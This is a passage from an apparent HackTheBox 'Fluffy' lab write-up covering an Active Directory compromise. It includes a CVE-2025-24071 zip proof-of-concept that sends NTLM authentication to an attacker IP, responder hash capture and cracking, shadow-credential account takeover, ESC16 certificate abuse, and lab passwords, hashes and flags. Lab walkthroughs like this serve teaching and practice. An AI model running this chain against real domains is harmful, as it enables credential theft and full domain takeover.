    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates
```
- Doesn't look like there's anything interesting here
- We could get a list of all templates by removing the `-vulnerable` flag if we don't find any other ways to progress

## Bloodhound
---
- We can use `bloodhound.py` and `rusthound` to collect `bloodhound` data for us, we like to use both since they can cover each other's bases
```sh
❯ bloodhound-ce-python -c all -d fluffy.htb -u j.fleischman -p J0elTHEM4n1990! -ns 10.129.41.165 --zip

❯ rusthound -d fluffy.htb -u j.fleischman -p J0elTHEM4n1990! -n 10.129.41.165 --zip
```

- Now we can start the `bloodhound` docker container:
```sh
❯ bloodhound-cli up    
```

![[Pasted image 20251219210026.png]]
- We very quickly see that `j.fleischman` has no interesting Outbound Object Control, so let's move on

## SMB - TCP 445
---
- We can grab the shares available to `j.fleischman` with the following `netexec` command:
```sh
❯ nxc smb fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --shares
...snip...
Share           Permissions     Remark              
-----           -----------     ------              
ADMIN$                          Remote Admin        
C$                              Default share       
IPC$            READ            Remote IPC          
IT              READ,WRITE                          
NETLOGON        READ            Logon server share  
SYSVOL          READ            Logon server share  
```
- We see that the `IT` share is a non-default fileshare that we have access to

- We can interactively enumerate the share with `smbclient`:
```sh
❯ smbclient //fluffy.htb/IT -U j.fleischman%J0elTHEM4n1990!
smb: \> ls
  .                                   D        0  Sat Dec 20 04:03:50 2025
  ..                                  D        0  Sat Dec 20 04:03:50 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
```
- `Everything-1.4.1.1026.x64.zip` contains the everything binary by `voidtools`, a utility to locate files by name "instantly"
- I don't know much about `KeePass` cracking so we'll leave this until we have to touch it
- `Upgrade_Notice.pdf` contains the following:
![[Pasted image 20251219211614.png]]

- If we do some digging into `CVE-2025-24071` we see the following [github POC](https://github.com/0x6rss/CVE-2025-24071_PoC) and description
> Windows Explorer automatically initiates an SMB authentication request when a .library-ms file is extracted from a .rar archive, leading to NTLM hash disclosure. The user does not need to open or execute the file—simply extracting it is enough to trigger the leak.

### poc.py
```python
import os
import zipfile

def main():
    file_name = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")
	
	
    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""
	
    library_file_name = f"{file_name}.library-ms"
    with open(library_file_name, "w", encoding="utf-8") as f:
        f.write(library_content)
	
	
    with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)
	
	
    if os.path.exists(library_file_name):
        os.remove(library_file_name)
	
    print("completed")

if __name__ == "__main__":
    main()
```
- Looks to be XML External Entity(?) (XXE) injection into the contents of the zipfile

## CVE-2025-24071
---
- In the `SMB` file share, it looks like zip files are being extracted, we can assume that whatever we upload to that fileshare is going to be automatically extracted
- We can use the `poc.py` to create a malicious zipfile that calls back to our IP address
```sh
❯ uv run --script poc.py 
Enter your file name: malicious
Enter IP (EX: 192.168.1.162): 10.10.14.50
completed
```

#### Note
- In order to run `responder`, we need to run it as root, and I installed it with `uv`. However, since uv likes to install itself in `~/.local/bin`, we can't perform `sudo uv` until we install it system-wide (for path reasons)
- (This may or may not be necessary but if so, keeping for logging)
```sh
sudo install -m 0755 ~/.local/bin/uv /usr/local/bin/uv
```

- We can capture the SMB request (including the `NTLM` hash) with `responder` 
```sh
❯ sudo ~/.local/bin/responder -I tun0
...snip...
```

- Now we upload the malicious zipfile to the `IT` `SMB` share:
```sh
❯ smbclient //fluffy.htb/IT -U j.fleischman%J0elTHEM4n1990!
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (1.9 kb/s) (average 1.9 kb/s)
smb: \> ls
  .                                   D        0  Sat Dec 20 04:38:15 2025
  ..                                  D        0  Sat Dec 20 04:38:15 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      330  Sat Dec 20 04:38:15 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 2036062 blocks available
```

- At first I was very confused why I wasn't capturing the response, but then I forgot that firewalls existed lol, we need to allow traffic over port `445`
```sh
[SMB] NTLMv2-SSP Client   : 10.129.41.165
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:694d7c62a58683d6:53201E3A6FA1BBF696D08B7DAAA68729:010100000000000080D6729E2F71DC0138A5BC9BA26D65FA0000000002000800370053004700550001001E00570049004E002D00520047004800360050004A00550047004A003500560004003400570049004E002D00520047004800360050004A00550047004A00350056002E0037005300470055002E004C004F00430041004C000300140037005300470055002E004C004F00430041004C000500140037005300470055002E004C004F00430041004C000700080080D6729E2F71DC0106000400020000000800300030000000000000000100000000200000FE524FB7C397BCD6F96FAC4DD1054345286AC13D0429B6D5CAA5FEDB4A5F5BDE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350030000000000000000000
```
- And voila! we have a [Net-NTLMv2](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#) hash, well more like a cryptographic challenge and response. Unlike `NTLM`, this hash can't be used for authentication

## Cracking Hash
---
- In order to utilize this hash, it can either be relayed or cracked, but since there's only one host and relaying to the original host typically doesn't work, we'll crack it with `hashcat`
- We save the `NTLMv2` hash into a file `hash` and then run:
```sh
❯ hashcat hash ~/ctf/TOOLS/wordlist/rockyou.txt
```

- It only takes around 30 seconds with CPU alone but we get the password! 
```sh
P.AGILA::FLUFFY:694d7c62a58683d6:53201e3a6fa1bbf696d08b7daaa68729:010100000000000080d6729e2f71dc0138a5bc9ba26d65fa0000000002000800370053004700550001001e00570049004e002d00520047004800360050004a00550047004a003500560004003400570049004e002d00520047004800360050004a00550047004a00350056002e0037005300470055002e004c004f00430041004c000300140037005300470055002e004c004f00430041004c000500140037005300470055002e004c004f00430041004c000700080080d6729e2f71dc0106000400020000000800300030000000000000000100000000200000fe524fb7c397bcd6f96fac4dd1054345286ac13d0429b6d5caa5fedb4a5f5bde0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00350030000000000000000000:prometheusx-303
```

- We can verify that the password works with `netexec`:
```sh
❯ nxc smb fluffy.htb -u p.agila -p prometheusx-303
SMB         10.129.41.165   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.165   445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
```
- We don't, however, get `WinRM` :(

# p.agila
## Bloodhound2
---
- Looking back at `bloodhound` it looks like `p.agila` has some more interesting Outbound Object Control:
![[Pasted image 20251219220406.png]]

- Their being a member of Service Account Managers gives them `GenericAll` over the Service Accounts group which has `GenericWrite` over three accounts
- `WINRM_SVC` is a member of the Remote Management Users group which could be pretty juicy

## Recover NTLM For winrm_svc & ca_svc
---
- The first thing we need to do is add `p.agila` to the `Service Accounts` group so that we get `GenericWrite` over the three users
	- We can do this because we're a member of the `Service Account Managers` group and have `GenericAll` over `Service Accounts`
- We can do this using `bloodyAD`:
```sh
❯ bloodyad -d fluffy.htb --host dc01.fluffy.htb -u p.agila -p prometheusx-303 add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts
```

- Now `p.agila` has `GenericWrite` over `winrm_svc`
- With `GenericWrite` over a user, we can: 
	- perform targeted Kerberoast (give the user a SPN, get a hash, and try to break it to get their password)
	- change their password
	- add a shadow credential
- We're gonna use `certipy` to add a shadow credential:
```sh
❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'cd7fa4e8674f46c6b3071dab41396cac'
[*] Adding Key Credential with device ID 'cd7fa4e8674f46c6b3071dab41396cac' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'cd7fa4e8674f46c6b3071dab41396cac' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

### Clock Skew
- Uh oh, clock skew is fucking us, let's quickly fix that:
```sh
❯ sudo ntpdate fluffy.htb    
```

### Shadow Credentials
- Now we can retry with shadow creds:
```sh
❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
...snip...
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

- While we're at it, let's grab the creds for `ca_svc` too:
```sh
❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
...snip...
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```
- Man what the hell. All kinds of issues today. I looked it up and it seems we just need to keep performing the `add groupMember 'service accounts' p.agila` command to offset this

```sh
❯ bloodyad -d fluffy.htb --host dc01.fluffy.htb -u p.agila -p prometheusx-303 add groupMember 'service accounts' p.agila 
[+] p.agila added to service accounts

❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
...snip...
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```
- It still took a couple of tries, lots of head-banging fr

- Let's verify our hashes real quick with `netexec`:
```sh
❯ nxc smb fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
SMB         10.129.41.195   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.195   445    DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767 

❯ nxc smb fluffy.htb -u ca_svc -H ca0f4f9e9eb8a092addf53bb03fc98c8
SMB         10.129.41.195   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.195   445    DC01             [+] fluffy.htb\ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8 
```

- It should come as no surprise that `winrm_svc` has access to `WinRM`! Let's get that  user flag:
```sh
❯ evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
b689b634119baf2b3d36c373474ce2fe
```

# Root Shell
---
## Bloodhound3
---
- If we go back to bloodhound and re-acclimate ourselves to what we own again, we notice that `ca_svc` is a member of the `Cert Publishers` group which `bloodhound` accentuates is a valuable group

## ADCS
---
- We can use `certipy` again to search for certificate vulnerabilities:
```sh
❯ certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```
- We see from the output that `ca_svc` has access to a certificate vulnerable to [ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)

## ESC16
---
- We can follow the [certipy wiki entry](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) for ESC16 to understand some background and to test if it's truly vulnerable
- ESC16 occurs when the CA itself is globally configured to disable the inclusion of the `szOID_NTDS_CA_SECURITY_EXT` security extension for all certificates it issues. This extension is responsible for “strong certificate mapping”, and without it, we can modify a user such that it can get a certificate as any user
- We want to get a certificate from `ca_svc` since they're the ones in control of this vulnerable certificate. We'll receive the ticket as user `winrm_svc`

1. Read initial UPN of the victim account (Optional - for restoration)
```sh
❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read

[*] Reading attributes for 'winrm_svc':
    cn                                  : certificate authority service
...snip...
    userPrincipalName                   : ca_svc@fluffy.htb
...snip...
```

2. Update the victim account's UPN to the target administrator's `sAMAccountName`
```sh
❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -upn administrator -user ca_svc update

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

3. Request a certificate as the "victim" user from any suitable client authentication template (e.g., "User") on the ESC16-vulnerable CA
```sh
❯ certipy req -dc-ip 10.129.41.195 -target DC01.fluffy.htb -ca fluffy-DC01-CA -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -template User

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
- `-dc-ip` - ip of the box (changed cuz I restarted)
- `-target` - host.domain
- `-ca` - certificate authority (found earlier via `nxc ldap -M adcs` or from `nmap -sCV`)

4. Revert the "victim" account's UPN
```sh
❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -upn 'ca_svc@fluffy.htb' -user ca_svc update

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

## Request Auth
---
- Now that we have the `administrator.pfx` certificate, we can use `certipy auth` to acquire a ticket and `NTLM` hash:
```sh
❯ certipy auth -dc-ip 10.129.41.195 -pfx administrator.pfx -u administrator -domain fluffy.htb

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

- We can verify the `administrator` hash works with `netexec`:
```sh
❯ nxc winrm fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
WINRM       10.129.41.195   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) 
WINRM       10.129.41.195   5985   DC01             [+] fluffy.htb\administrator:8da83a3fa618b6e3a00e93f676c92a6e (Pwn3d!)
```

- A beautiful sight! Let's get that root flag:
```sh
❯ evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
826ffd1312a3fea373a07a358c9a9382
```



